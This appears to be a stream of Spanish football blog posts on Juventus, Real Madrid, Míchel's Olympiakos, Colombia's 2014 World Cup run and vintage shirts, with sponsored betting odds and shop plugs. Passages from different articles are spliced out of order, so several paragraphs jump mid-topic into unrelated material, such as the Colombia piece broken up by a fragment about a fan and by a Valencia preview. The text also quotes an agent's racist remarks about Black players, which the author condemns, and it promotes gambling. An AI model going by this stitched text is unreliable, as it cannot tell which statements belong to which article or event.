su indisciplina? ¿Hará algo Llorente? ¿Es fiable la otrora inapelable defensa juventina? ¿Mantendrá Varane el nivel apuntado antes de su lesión?Pese al favoritismo del Madrid, este parece un partido abierto. Es clave para mí la presencia de Tévez, un jugador que imprime carácter al equipo. Y no sólo carácter, es poco académico pero incansable. Su juego es generoso con los centrocampistas, menos con la pareja de ataque, y alivia el embotellamiento al que tiende el juego de Pirlo y Marchisio cuando las cosas no salen. Es el pecado de Llorente. El español es fundamental si el juego va fluido, si los balones se derraman por el área. Si las cosas van bien, Llorente marca. Tévez, de ahí el mérito que le está dando el entrenador, está siendo fundamental precisamente porque da nuevas soluciones al mal momento de juego de los bianconeri. Tévez es un disolvente.En el Madrid está lo de siempre: Cristiano Ronaldo. Un jugador que gana partidos. Incuestionable en estos compases titubeantes de un Ancelotti superado por el reto. Aunque sólo sea momentáneamente. En el juego de pizarras Conte está más avezado. Ancelotti es un italiano poco italiano. Conte es el canon transalpino, el equilibrio entre defensa y ataque, la capacidad de sacrificio, el talento incrustado en el músculo. Hoy no estará Isco y Modric debería ser más de lo que es en este tipo de partidos. De poco sirve el disparo lejano o la asociación en zonas templadas si no llegan balones francos a los delanteros. Di María está asumiendo la parte del trabajo que deberían hacer los mediapuntas. Se echa de menos a Özil con motivos. Si Modric diera un paso al frente, hoy puede hacerlo si Khedira e Illarra lo acompañan en la medular, quizá el equipo se replegaría con más alegría y Benzema volvería a conquistar los espacios.Apuestas en Bwin:1. El empate se paga a 4.20 €. Es el partido más exigido para ambos y es normal que especulen viendo que un punto no sería mala pesca en un encuentro como este.2. Complicado el tema de los goleadores. Isco a 2.50 y Tévez a 2.30 son buenas formas de doblar lo metido, pero: ¿qué os parece un gol de Pirlo a 7.00 €? ¿y uno de Pepe a 9.00 €? El balón parado existe.3. Vamos a lo seguro. Imaginad un partido plácido para los de Ancelotti. Un 2-0 quizá. Pues a 6.75 la jugada. Muy de porra ese marcador. Todos sabemos quien es Lady Gaga aunque muchos ni siquiera han oído sus canciones. Su presencia es noticia. No es lo que haga, diga o cante, no… la noticia es que exista. Que ande, que respire, que se deje ver sola o rodeada de amigos. Hable o no hable, todos buscan a Lady Gaga. Dan igual sus canciones, sus espectáculos, sus premios, su afinación o sus torpes coreografías.Doce goles en el Bernabéu, contando los tres de ayer. No se puede pedir más a un futbolista.A Ronaldo, tal vez enfurruñado por una pobre actuación a nivel personal, le perdió la boca en zona mixta. Muy caliente por la debatible pero ya irretroactiva actuación de Undiano Mallenco, el portugués se puso melancólico como un cantante de fado. ‘El trato no es igual cuando juegas en el Madrid (…) Es obvio que molesta que gane el Madrid. Genera envidia. ‘, disparó. ‘El árbitro estaba blanco desde el principio. No se puede pitar con miedo. Ojalá este árbitro no pite la final de Copa. Este árbitro no estaba preparado para este partido. ‘, cargó contra Undiano. El colegiado navarro, por cierto, acumula con el de ayer nueve Clásicos en su historial, incluida la final de Copa de 2011. Puede ser un discutible árbitro pero preparado, lo que se dice preparado, no habrá otro con mejor preparación que él.Más allá de que la actuación arbitral fuese buena o mala (un juicio que normalmente suele ir por barrios), a Ronaldo se le permitió juzgar al juez precisamente el día en el que peor parado habría salido el portugués de un juicio público. Quis custodiet ipsos custodes? ¿Quién vigila al vigilante? No vamos a entrar a debate ahora sobre si el nivel arbitral en España es digno de la competición o no lo es. Los errores del árbitro son algo indeseable pero inherente a la naturaleza de su labor. Equivocarse entra dentro de lo razonable, máxime cuando aquellos a los que se debe juzgar no sólo no colaboran sino que se esfuerzan todo lo posible en entorpecer la tarea de enjuiciamiento. Me sigo sorprendiendo de que un futbolista o un aficionado se lleve las manos a la cabeza por un error (o una sarta de errores, lo mismo me da) de un árbitro. Como si fuese algo inconcebible. Por desgracia, los alimentadores de las ridículas teorías conspiratorias continuan engordando sus buches con actuaciones como la de Undiano. Todos creen que son los perjudicados. No hay favorecidos, solo agraviados. Y la lista de agraviados de Undiano, precisamente, es muy extensa. Cristiano es muy libre de pensar que el mundo está contra él y su equipo, que todo forma parte de una campaña maquiavélica dirigida a desprestigiar su trabajo y a torpedear el camino del Real Madrid. Pero queda tristemente en evidencia cuando todo su argumento para explicar una derrota como la de anoche tiene como único punto de apoyo una, según él, deficiente labor arbitral. ‘Esto es un sueño, una ilusión. No es una profesión, sino una vocación. Pensad en cuando érais niños: ¿cuántos niños crecieron a vuestro alrededor jugando a ser abogados? Ninguno. ¿Quién jugaba a ser futbolista? Prácticamente todos. ‘. Entre las numerosas perlas y anécdotas que nos deja la brillante entrevista de Sid Lowe en The Guardian a José Miguel González ‘Míchel’, actual técnico del Olympiakos griego, la que se refiere a su estrategia de motivación de sus futbolistas de cara a la histórica eliminatoria de octavos de final de la Liga de Campeones ante el Manchester United es una de las que más llaman la atención. Quien recuerda vivamente al Míchel jugador, no creo que lo tuviese por un futbolista especialmente sensible a la motivación. El eterno ‘8’ madridista era un sensacional centrocampista, un excepcional pasador y exquisito hombre de club, pero no fue nunca un ejemplo de intensidad cuando vestía de corto. Es más, sorprende que el que era un futbolista acusado en ocasiones de cierta indolencia sobre el verde, pulse ahora la tecla del futbolista vocacional, de la ilusión y el compromiso para aumentar en un par de puntos el rendimiento del campeón heleno.Míchel no ha tenido una carrera particularmente sencilla como entrenador. Mientras por un lado era torpemente ensalzado sin apenas haber adquirido mérito alguno, por otro era inmisericordemente torpedeado y menospreciado, casi como una consecuencia directa de esa ridícula loa, tan desmesurada como inmerecida. Su trabajo era siempre observado desde un prisma distorsionador, como si viviera bajo una especie de caleidoscopio. Dependiendo de quién lanzara la mirada sobre su figura, ésta aparecía de una forma o de otra. Brillante u oscura. Ilusionante o tediosa. Míchel ha vivido un inicio de carrera (es natural pensar que aún le quedan unos cuantos años en los banquillos) agitado y viciado por la opinión que de él tenía un público que lo conocía bien de su etapa como futbolista y que ya había emitido sentencia sobre el juicio a su persona.Vallecas, Valdebebas, Getafe y Sevilla. Escenarios para tratar de cambiar una tendencia a caricaturizar su trabajo, a prejuzgarlo y a entender que simplemente por ser Míchel, por ser exfutbolista del Real Madrid y ser dueño de una personalidad particularísima, había que examinarlo con mayor minuciosidad y exigencia que al resto. La mezcla de naturalidad y sinceridad que habituaban a desprender sus palabras, ese estilo directo pero educado, mezclando sorna con chulería, nunca terminó de calar en aquellos que se criaron detestando futbolísticamente al Míchel que, vestido de corto, colgaba regalos para Hugo desde la banda derecha del Bernabéu. Venían seriamente condicionados por un pasado intenso. Tal vez por eso, en ninguna de esas cuatro etapas consiguió zafarse del placaje cansino de sus numerosos detractores.Parecía evidente que para tratar de progresar en su carrera como técnico, Míchel tendría que salir de España hacia un entorno menos hostil y en el que partir de cero con la tranquilidad de quien sabe que no será prejuzgado. El proyecto del Olympiakos, firme dominador en el fútbol griego especialmente favorecido por los graves problemas financieros del Panathinaikos en los últimos años, se presentaba como un escenario propicio para trabajar alejado del continuo foco de tensión de la prensa española. La experiencia era novedosa. Coger un equipo ganador ya hecho tras la sorprendente destitución de Leonardo Jardim cuando se mantenía como líder destacado del campeonato, mantenerlo en lo más alto en la competición local y tratar de firmar alguna página para el recuerdo en competición europea.No pudo ser en su primera intentona. Recién aterrizado en El Pireo, Míchel no consiguió guiar a su nuevo equipo a la siguiente ronda de la Europa League de la pasada temporada, cayendo precisamente ante el Levante de JIM en dieciseisavos de final. Esta temporada, ya asentado en el cargo, conociendo a su plantilla en profundidad y habiendo asimilado las particularidades de su nuevo club, el técnico madrileño consiguió firmar una notable fase de grupos en la Liga de Campeones, pasando a octavos tras superar un grupo con PSG, Benfica y Anderlecht. Pero el sentimiento en el club del laureado olímpico sigue marcado por la pena ante su desgracia continental. Nunca Olympiakos consiguió pasar de la primera ronda de eliminatorias de la Liga de Campeones (antaño cuartos de final, hoy octavos), a pesar de ser un habitual de la máxima competición continental, con un abrumador record de quince participaciones en las diecisiete últimas ediciones del torneo. Ahora, seriamente debilitado tras la pérdida en el mercado de invierno del goleador Konstantinos Mitroglou pero con varios viejos conocidos bajo sus órdenes como Saviola (hoy ausente por lesión), Roberto, Joel Campbell o Iván Marcano, Míchel buscará su Olimpo particular tratando de guiar a los suyos a los cuartos de final pasando por encima de un Manchester United que, pese a su teórico favoritismo, se presenta en Grecia en unas horas bajas de las que el preparador español es bien consciente. ‘Nosotros no somos favoritos… pero nadie puede decirnos que no podamos intentarlo‘. Nadie espera menos. Colombia se impuso a Uruguay sin sobresaltos (2-0) y ya está en cuartos de final del Mundial por primera vez en toda su historia. Nadie que viviese de manera más o menos consciente e intensa el Mundial de Estados Unidos en 1994 puede ser ajeno al logro cafetero.Lo que no se entiende es que el tipo en cuestión, perfectamente identificado, no recibe un multazo que no pueda evitar recordar en el futuro cada vez que se acerque a menos de un metro de un paraguas. Sobre prohibición de entrar en recintos deportivos no hablamos, que todos sabemos cómo funcionan los tornos en los campos y este artículo no pretende ser cómico.Los pilares del templo. La vorágine de noticias lo ha ocultado un poco, pero hacía tiempo que el dueto de centrales campeones-de-todo no plantaba sus reales delante de Valdés. Los números defensivos del Barcelona en casa son perfectos, así que habrá que esperar la influencia de la doble P especialmente en los partidos a domicilio, en los que el Barça se está mostrando algo más vulnerable de lo habitual. Para certificar su regreso, tanto el gran capitán como el responsable del invento –Guardiola dixit– dejaron su firma en el marcador del Camp Nou. Gritando con fuerza que están de regreso.Fuego en Valencia. Es un estupendo goleador, uno de los escasos rematadores de raza que sobreviven en el panorama europeo a la epidemia de falsos nueves, enganches reconvertidos y demás zarandajas que constituyen el no va más del fútbol ultramoderno. Pero cuando a sus cualidades goleadoras añade la rabia del despreciado, el desafío del partido mayúsculo y el ansia de la remontada, Soldado deja de ser un delantero normal para convertirse en una bola de fuego sagrado capaz de incendiar a cualquier enemigo. Dos tantos legales, un golazo anulado y la sensación de alma del equipo para poner en evidencia a Del Bosque y demostrar que él, al menos, sí mereció el empate.Líder cuando hay que serlo. Sabíamos que era una pieza fundamental del fantástico mecano que montó Garrido la temporada pasada, capaz de aunar como pocos deleite y competitividad. Ahora hemos aprendido que con Rossi hecho pedazos, Nilmar tres cuartos de lo mismo, Senna al borde del retiro y un mundo de bisoñez alrededor, Borja Valero puede cargar sobre sus hombros la triste realidad de un Villarreal en regresión. Frente a un Betis que camina por la senda de toque y distinción que siempre ha caracterizado a los amarillos, Borja ejerció de ancla y pivote, lanzó contragolpes cuando fue necesario, y decidió el partido con una vaselina que nos han repetido muchas menos veces de lo que sería justo. Las tácticas cambian, los jugadores permanecen.Pasión turca. No se ha hablado mucho de él ni en lo bueno ni en lo malo, ni cuando el Atleti iba a comerse el mundo en Septiembre ni ahora que Noviembre amenaza con tragarse a Manzano. Sin embargo, no es difícil adivinar que una gran parte de las posibilidades del actual proyecto rojiblanco pasan por los pies de este futbolista menudo y talentoso, racional casi siempre y racial cuando toca, que aúna velocidad en corto y fantástico desplazamiento de balón. Ídolo en Turquía, ayer silenció el runrún del Manzanares con una aceleración y un centro perfecto que volcaron definitivamente el partido. Quizá acabe siendo más decisivo que otros con más nombre.La emotividad. Todos recibimos a diario mensajes hablándonos de niños enfermos o con problemas y necesidad de transplantes, y en cierto sentido estamos inmunizados contra la dureza intrínseca a estas situaciones. Sin embargo, conviene no minusvalorar el poder del fútbol como transmisor de emociones, y resulta imposible no conmoverse ante las lágrimas de Martins dedicando el gol a su hijo. Todo el amor, el miedo, la alegría y la desesperación unidos en un gesto donde se condensa lo mejor de ser futbolista y lo mejor de ser padre. Inolvidable. ¿Qué se le pasa por la cabeza a un jugador multicampeón de Europa, veterano de mil batallas y con doscientos años de experiencia al máximo nivel, para hacer esto? No lo sabemos, pero nada bueno a tenor de las imágenes que nos han traído al instante a la cabeza el peor y último recuerdo de la carrera como futbolista de Zinedine Zidane. De acuerdo en que media provocación, pero un futbolista como Eto’o, al que creíamos en su madurez personal, no puede perder los estribos de ese modo y embestir como un morlaco en los sanfermines. A pesar de que ni el árbitro ni los asistentes vieron la acción –lo cual sirvió por cierto a Samuel para lograr un golazo de bandera- la sanción se presume durísima, a tono con la gravedad de la agresión. Como consecuencia, un Inter en caída libre deberá jugarse la clasificación en Champions sin su mejor futbolista, y todavía hemos tenido que escuchar hoy a Benítez justificando el cabezazo. Así le va. La noricia más esperada en el momento más inesperado. El Sevilla cerró ayer el traspaso de Luis Fabiano al Sao Paulo por un precio aproximado de trece millones de euros, de los cuales sólo siete y medio irán a las arcas del club. El ariete ha sido un clásico de nuestra Liga, y más de cien goles con la camiseta sevillista le contemplan, así que a sus treinta años quizá suena algo prematuro un regreso a Brasil, que en en estas circunstancias suele funcionar como cementerio de elefantes. Lo que es indudable es que al de Campinas hace tiempo que le veía adusto, circunspecto incluso tras la descarga de adrenalina que siempre supone marcar, y proclamaba a la menor ocasión su interés por salir de la capital andaluza. Desde el punto de vista del ambiente del vestuario, por tanto, su salida de antoja necesaria, pero también es cierto que exigirá un salto de calidad en Negredo: el vallecano trajo muchas expectativas tras su periplo almeriense, pero hasta la fecha no ha ofrecido, ni de lejos, las prestaciones de un jugador que ha vestido el nueve de la canarinha y que ha sido, en algún momento, uno de los mejores delanteros del mundo. Suerte para O Fabuloso. Ya tenemos aquí un nuevo Real Madrid-OL. Los choques de Champions League entre el equipo español y el galo llegan con la misma puntualidad que los goles de Messi, los numeritos de Balotelli o las victorias del Bayern, y tanta repetición acaba generando en las aficiones una sensación muy próxima al desinterés y el hastío. Si el gran valor del fútbol, y muy especialmente el del gran fútbol internacional de élite, reside en la memoria de enormes partidos que nadie olvidará jamás, la profusión en la repetición acaba confundiendo en el recuerdo unos enfrentamientos con otros, eliminando los detalles que los hicieran únicos, y en definitiva, enviándolos al olvido de una amalgama gris de fases previas y eliminatorias. Este problema constituye una gran desventaja del actual formato de Champions League respecto a la antigua Copa de Europa, y si bien las luchas entre colosos resultarán siempre inevitables en las últimas rondas, no costaría nada situar un pequeño filtro en el sorteo inicial que actuara como corrección de esta anomalía. Ayer mismo quedaba un mundo de papel por vender en el Bernabéu.Sigue sin ser el Olympique un conjunto que resulte amable para el Real Madrid. Aunque el enfrentamiento de la pasada temporada rompió de una tacada varios maleficios – tanto la cacareada “maldición de octavos” como la imbatibilidad del equipo lionés en los partidos contra los merengues”-, siguen todavía casi en carne viva en el madridismo los tiros libres de Juninho Pernambucano, más de un partidazo de Toulalan o Malouda, los ridículos de Gerland y, sobre todo, aquella eliminación europea que supuso el ataúd de Pellegrini, la crucifixión mediática de Higuaín y la confirmación definitiva de que aquel Madrid pseudogaláctico se reducía a un ciego sin lazarillo en ausencia de Xabi Alonso. Algo que no parece haber cambiado, al menos mientras Nuri Sahin permanezca inédito.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. A pesar de estos antecedentes, el partido de esta noche presenta al Real Madrid como favorito muy claro, y envuelto únicamente en el debate menor de Benzema y/o  Higuaín. Seguramente no tendrá mejor ocasión Mourinho para probar juntos a los dos arietes, pues el Pipa viene de una semanas prodigiosas a nivel goleador, a la vez que Karim ya se ha recuperado de su lesión, ha pasado dos meses siendo el mejor del equipo, y se motiva especialmente contra el club que le lanzó a la fama. Con seis de seis hasta el momento en la competición, parece una ocasión perfecta para probar desde el principio al equipo con dos delanteros, en un cambio de cromos que podría implicar la ausencia en el once titular de los dos medios matraca de bajo nivel que regularmente lastran el fútbol del Madrid. Podríamos hablar de que esto es fútbol-ficción tratándose de Mourinho, si no fuera porque hace pocas semanas hemos comprobado frente al Rayo el efecto de quitar a Lass (en la primera parte!) y sacar a un estilista, Özil en aquel caso. Fue exactamente la diferencia entre el ridículo y el huracán.El Olympique, por su parte, llega hoy al coliseo blanco como un equipo muy afeitado respecto del que en algún momento de los últimos años llegó a oler la gloria europea. Rebajado tras las oscura etapa de Claude Puel, en la que cedió el cetro del fútbol galo al REF tras siete años de dictadura ininterrumpida, y en segundo plano mediático a causa de los dispendios petroleros del PSG, el joven técnico Rémi Garde está tratando de montar una escuadra sólida y eficiente a partir del buen rendimiento ofensivo del poderoso Gomis, la solidez del joven Maxime Gonalons en el medio y del bosnio Lovren atrás, y la profundidad del brasileño Bastos por la banda izquierda. Nos quedaremos sin ver hoy a Lisandro, que lleva un tiempo lesionado en el tobillo, y también a Clément Grenier, la última perla de la Academia, que amenaza con jubilar al ciclotímico Gourcuff. Dos bajas de nivel a las que quizá se una el arquero Lloris, con problemas estomacales. Un hándicap bastante grande para un conjunto que, en vista de las declaraciones previas de sus jugadores, daría por bueno un empate. Su lucha es contra el Ajax. En bwin se ofrecen jugosas cuotas de apuestas para el partido de esta noche. Ya el empate, el resultado más frecuente entre los dos clubes en Chamartín, se paga a 6,25.Porque el equipo dirigido por José Pékerman enlaza directamente en la memoria con aquella generación inolvidable que, de la mano del Pacho Maturana, sucumbió a una presión inhumana en la cita mundialista estadounidense para pasar de prevista revelación a decepción absoluta del torneo. De aquella Colombia se esperaba mucho. Era un equipo valiente, con futbolistas de primer nivel en su plenitud y educado en un fútbol ofensivo y vistoso. Pero su papel mundialista acabó convertido en una cuestión de estado. Y esas cosas, en la Colombia de los años noventa, eran asunto delicado.El equipo de Maturana dejó un inesperado vacío en el corazón de los aficionados al fútbol de todo el planeta. Tras caer ante Rumanía (1-3) y la anfitriona Estados Unidos (1-2, con aquel maldito gol en propia meta de Andrés Escobar), los colombianos se impusieron en el último partido de la fase de grupos a Suiza, cuando la suerte de aquella generación estaba ya decidida. Las consecuencias de aquella decepción fueron demoledoras, e incluso trágicas en algún caso concreto. Colombia repitió cita mundialista en el año 98, pero aquella brillante hornada de principios de década estaba ya prácticamente consumida en su totalidad.Pero la Colombia de Valderrama, Asprilla o Rincón tiene una más que digna heredera en el equipo de los Cuadrado, Jackson Martínez, Yepes o James Rodríguez. ¡Qué futbolista, James Rodríguez! El volante ofensivo del Mónaco es, por el momento, el jugador del torneo.¿Aquella con la enorme banana en el centro? En su momento, cuando hubo que dar la cara, la Federación Rusa se apresuró a cavar un buen hoyo e hizo como el avestruz. “No hubo nada de racista en el incidente” argumentaron los artistas, dinero de la candidatura manda, después de que tanto la FIFA como la UEFA pasasen olímpicamente del tema. ¿Quieren ver imagen ampliada de ese chicle asqueroso? No se preocupen, para eso están las declaraciones del representante de futbolistas Vladimir Abramov al portal Sports.ru. Les adelanto una y continuo en el siguiente párrafo. “Los equipos no deberían tener más de un jugador negro. Cuando hay más de uno se vuelven agresivos”Abramov se pone el salacoy y comienza a avistar salvajes. “Peter es un profesional, al contrario que la mayoría de nigerianos. Son muy insolentes, cabezotas y demuestran un evidente nacionalismo negro. Cuando se juntan más de tres nigerianos no tienen miedo de nadie”. Y sigue el cráneo privilegiado. “La influencia de los nigerianos en las ciudades sólo significa drogas y sida” (…) “La selección francesa, donde juegan muchos negros, no guarda relación alguna con la realidad de europa” (…) “Los equipos no deberían tener más de un jugador negro. Cuando hay más de uno se vuelven agresivos” (…) Más tarde deja la faena a punto de caramelo con mi favorita,  “mira, soy muy respetuoso con los negros: tengo amigos negros pero Rusia no está preparada para ellos. Esto es así”, y la remata afirmando que cuando dice tonterías se disculpa. ¿Cuando es la última vez que te has disculpado? Nunca, dijo el angelito con su país esprintando hacia el Mundial y el chicle se pegó un poquito más a la suela. El partidazo de la jornada en el fútbol italiano lo sería más si el Inter fuera un club normal. Si a cada resbalón de sus gerentes no le hubiera seguido otro de los jugadores para acabar posando el culo a 23 puntos del líder, si el zumbido animal del calciomercato no lo ocupase todo a estas alturas del campeonato. Hubiéramos preferido un Inter sano para el derbi de Italia, también una Juventus más terrenal, pero aún sin esos ingredientes el partido debe ser bueno para resolver algunas incógnitas.La Juve necesita probar que la eliminación copera contra la Roma y el muy sudado empate ante la Lazio no son síntomas de flaqueza; el Inter simplemente necesita los puntos. Para regar un poco el incendio social que causan sus actuaciones y mantenerse vivos en zona Europa. Los terceros actores jugarán a setecientos kilómetros, el Roma-Parma es importante porque el resultado del Olímpico puede apretar la tabla por varios sitios.Si en Vinovo preparan el derbi desayunando certezas cada mañana y tan solo esperan la baja de Buffon, sancionado por su expulsión ante la Lazio, en la Pinetina es época de experimentos y arengas. Mazzarri no para de pedir apoyo a su afición y espíritu combativo a sus jugadores. Huevos, que parece ser la única receta posible visto que el juego ni acaba de llegar ni se le espera.Lejos de la charlotada en Copa contra la Roma, la Juve alineará al equipo de gala.Con Pirlo, Tévez y un Llorente inspirado al que además se le supone picado tras el fichaje sorpresa de Osvaldo por petición expresa de Conte. El Inter, sin Esteban Cambiasso y quizá sin Diego Milito, viene ensayando la vuelta al abrigadísimo 3-5-1-1 con Rodrigo Palacio de ejecutor y Álvarez enganchando un poco más abajo. De todos modos, el ambiente previo huele más a mercado de fichajes, parece que llegará Hernanes una vez que Tohir ha comprendido que su afición necesita cromos como el comer, que a 90 minutos de rivalidad.Apuestas en BwinEl domingo puedes hacer dos cosas con ese fajo de billetes que tanto trabajo te ha costado arrancar: tirarlo por la ventanilla de un coche en marcha mientras te ríes a carcajadas o apostar a que el Inter vence en Turín. Los de Antonio Conte han ganado todos sus partidos en casa esta temporada, los de Mazzarri ya se han dejado trece puntos ‘on tour’. De todos modos ustedes verán, un sorpresón como aquel 1-3 que desvirgó por primera vez el Stadium se paga a 7. Algo más seguro es apostar a gol de Fernando Llorente, dos euritos por cada uno apostado para una jugada de bajo riesgo. Cada quince días y de la mano de Classic Football Shirts, la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.Aquella noche, sentado al borde del camastro de mi habitación alquilada, la televisión vomitaba concursos para necios y yo me preguntaba como coño podía haber salido mal. Hace media hora hubo otra media hora mejor. ¡Mierda! ¡Si la tenía rota! Abotargado de botellines, seguro que luciendo esa media sonrilla idiota que se me pone, no hago otra cosa que lanzarle miradas desde el fondo de la barra. Digo yo que tendrá que darse cuenta porque en el único bar español que aun no ha cerrado somos cuatro gatos mal contados. Una pareja de bakalas destemplados que se están tirando los trastos a la cabeza con la normalidad del que lo hace a diario, el dueño y nosotros dos. Claro que se ha dado cuenta imbécil. ¿No ves que te ha devuelto la sonrisa? . Hoy mojas. Entonces ella se levanta del taburete y enfila para el tuyo. Los taconazos la han llevado hasta ti y justo cuando vas a soltarle la tuya, cacharro en mano y cara a cara como en las pelis de Leone, te espeta. “Cariño, ni lo intentes con ese chándal del Madrid”. Y es que a todos nos gusta pensar que somos tipos interesantes. Eso es así aquí y en la China popular pero hay que tener cuidado con los contextos. Que no dan lo mismo ocho que ochenta. Y a las doce y media de la noche, rodeado de colegas y combinados, eras el amo con tus trazas de Mijatovic y a las seis en Casa Luis, con un mujerón delante, eres un patán. Aun así hay que reconocer que la vestimenta deportiva añeja tiene encanto por donde se mire si uno es un enfermo de la pelotita. Vamos a ver, que con esas pintas calentaron los tipos que han hecho historia. Y si aquella no lo entiende es que está muy perdida. Muy perdida. Por eso darse una vuelta por la sección de Jackets & tracksuits de CFS es una gozada. Porque te puedes agenciar el Meyba de cuando el Barcelona era terreno pese a contar con Maradona en nómina o aquella chaqueta con la que el Madrid sopló cien velas.Luego está el asunto indie. ¿Qué joven urbano puede resistirse a guardar el iPod en los bolsillos de la chaqueta original del Aston Villa del 71? De celeste y grana, con el nombre del club a la espalda como si fueses un T-Bird, el doble diamante de Umbro bordado en la pechera y el RockdeLux bajo el brazo. Como bien dice mi amigo Antonio, más chulo que un ocho verde pistacho. Que decir de la prenda  que usaban leyendas como Ossie Ardiles, Hoddle y Chris Waddle en el Tottenham, de la preciosa chaqueta con la que el primer Manchester de Sir Alex Ferguson (aun con los geniales Gordon Strachan y Bryan Robson en plantilla) comenzaba a apuntar maneras, de un señor chubasquero del Nottingham Forest, o de esas chaquetas de la Juventus, tan sobrias como la propia institución. Que esas no tienen otro nombre. Que son joyas.Puedes comprar esta camiseta y cientos más en Classic Football Shirts. Uno recuerda aquellas ligas sin presencia alien y los Valencia-Barcelona como algo muy grande. Hoy en día, rodillo blaugrana mediante, el evento pinta un poquitín descafeinado pero la distancia entre ambos, notable por otra parte, no debería hacernos olvidar que lo de Mestalla sigue siendo un menú de categoría. Solo adviertan que frente a frente estarán los dos mejores equipos en lo que llevamos de 2011, primero contra tercero, un césped abarrotado de cromos internacionales y la sensación en los locales, once partidos sin probar el polvo avivan la moral de cualquiera, de que pueden meterle mano al mito. Y la bombonera eléctrica que siempre es Mestalla y que vuelve el Guaje Villa a la hierba donde se hizo un nombre. Casi nada.El caso es que Pep Guardiola no conoce la victoria como técnico en terreno che y lo cierto es que llega en mal día para alterar la estadística.No son ya sus cinco goles en cuatro partidos, es su ascendencia sobre el resto del equipo, su participación en el juego y su seguridad total y absoluta cada vez que el balón llega a sus pies. James celebra sus goles con cara de que quiere más, de que todo lo que lleva hecho hasta el momento está muy bien, sí, pero que aspira a firmar un torneo inolvidable. Tiene confianza ciega en sí mismo y en el grupo. Toneladas de confianza en el fútbol aseado y fluido, de velocidad en la circulación y el repliegue, que su equipo practica honrando la memoria del toque-toque del equipo del profesor Maturana. La confianza, precisamente, que se le negó a aquel combinado del 94. El fútbol siempre concede revanchas. Colombia, veinte años después, ya tiene la suya. La que merecía.Puedes comprar camisetas de Colombia, desde 17.99 libras, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Compré mi primera camiseta de fútbol con mis propios ahorros cuando tenía catorce años. Recuerdo la edad con nitidez porque era una camiseta hummel del Real Madrid de la temporada 1992/93. Por aquel entonces, el merchandising era una palabreja en inglés de la que, por supuesto, desconocíamos su significado. Las tiendas de los clubes no tenían tres lujosas plantas, no vendían un sinfín de productos con la imagen del club y no se llamaban store. La del Bernabéu, concretamente, era un barracón de obras, una caseta prefabricada colocada en la vieja explanada que daba a la calle Padre Damián en la que apenas cabían un puñado de prendas oficiales, alguna postal y unos pocos pósters. De allí me llevé mi primera camiseta oficial. Hasta entonces había tenido las típicas camisetas de algodón, simples imitaciones de las camisetas oficiales con el escudo y el número de rigor cosido a mano pacientemente por mi madre. Recuerdo por supuesto la del Athletic y, vaya usted a saber por qué extraño motivo, una del Barça y otra del Betis. Pero aquella camiseta hummel del Madrid era otro nivel. Brillante como un camisón de raso, llevaba el dorsal ‘2’ serigrafiado en la espalda con la tipografía oficial. Me costó algo más de ocho mil pesetas, los ahorros de muchos meses.Desde entonces, he comprado muchas camisetas de fútbol. Muchísimas. Y lo he hecho siempre asumiendo que se trataba de un producto extremadamente caro, con un precio fuera de mercado y del todo desorbitado para tratarse de un simple trozo de tela fabricado en serie por cuatro duros en cualquier país del sudeste asiático. Ese ha sido nuestro gran error como consumidores: dar por bueno un precio que nunca debería haber sido permitido. ‘Noventa libras en una camiseta para los seguidores de Inglaterra es mucho dinero. La lealtad de nuestra afición es el principal soporte de nuestro deporte nacional. Ese precio necesita ser reconsiderado‘. El asunto del abusivo sobreprecio de la camiseta de la selección inglesa que Nike acaba de presentar del cara al próximo Mundial mantiene revuelta a la afición de los ‘Three lions‘. La polémica ha llegado a tal punto que incluso Helen Grant, Ministra de Deportes del gobierno de David Cameron, se ha pronunciado al respecto instando al gigante deportivo norteamericano que viste a los equipos de la Football Association desde hace un año a que recapacite sobre el precio fijado para las camisetas inglesas (noventa libras en su versión oficial y sesenta en la versión réplica). Por su parte, la federación ha recordado que la política de precios de Nike es un asunto que no es de su incumbencia y sobre el que no tiene potestad alguna, y que gracias a empresas como la firma de Oregon puede seguir trabajando en beneficio del fútbol.En Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo, puedes encontrar las camisetas Nike de Inglaterra. Y lo bueno es que a un precio considerablemente más bajo del fijado por la multinacional estadounidense. Y si eres un nostálgico empedernido… Entonces tienes un auténtico paraíso a tu disposición. Al principio fue sorpresa. Como se salía de lo habitual, de lo que alguien alguna vez estableció que debía de gustar, pronto acabó en hazmerreír y motivo de mofa. Ni siquiera aquellos que debían de haberlo entendido como la tierna representación de un orgulloso ejercicio de patriotismo dieron cobertura al diseño presentado por Adidas aquel mes de febrero de 2014. No es el rosa, por diversos motivos, un color popular en el fútbol. Combinado con el color mostaza el asunto estilístico quedaba aún más en entredicho. Pero la firma alemana, esta vez sí, sabía lo que hacía. El nuevo diseño que vestiría a la selección de Escocia durante la fase de clasificación de la Eurocopa en aquellos partidos en los que la coincidencia de colores le impidiera emplear el habitual azul oscuro tenía una explicación.Archibald Primrose, quinto conde de Rosebery, fue un prohombre británico de ascendencia escocesa que ocupó diversos puestos de enorme relevancia política en los últimos años del siglo XIX y primeros del XX. Primer ministro entre los años 1894 y 1895, Primrose fue líder del Partido Liberal y mantuvo una ideología fiel al imperialismo como Secretario de Exteriores.Si sale el partido trabado, es interesante saber que exactamente dos goles del Madrid están a 3,60, y que un gol se paga uno a cinco, y que la combinación empate al descanso/victoria final de los blancos –como pasó frente al Betis, por ejemplo- revierte en 4,40. Finalmente, destacar que un gol del ariete Gomis se cotiza a 3,50, y sube a 10 si es el tanto que cierra el marcador. Como gritando que hay vida bastante más allá de lo del próximo lunes, la Liga ha mostrado su calidad este sábado con tres partidazos. En ellos hemos visto a tres de los miembros de la clase noble de la competición sufrir en casa contra equipos inferiores a priori, e incluso caer derrotados en sus feudos respectivos a Sevilla y Atlético. Los hispalenses han pagado media hora infame ante un ortodoxo Getafe (1-3), que ha remontado el gol inicial de Kanoute y ha basado su victoria en la contundencia –estupendos los goles de Miku y Pedro Ríos– y en una precia interpretación del ataque posicional. Un rato después, en un partido de ida y vuelta, el Español ha tumbado al Atleti en el Calderón (2-3), en un encuentro gobernado por Javi Márquez, animado por el bullicioso Agüero, y finalmente decidido por un Osvaldo estelar, autor de la asistencia del segundo gol y ejecutor despiadado del tercero. Quien sí ha dado la talla ha sido el Villarreal, sin lugar a dudas el mejor equipo de “la otra liga”, que ha amargado el debut de Aguirre en la Romareda (0-3) 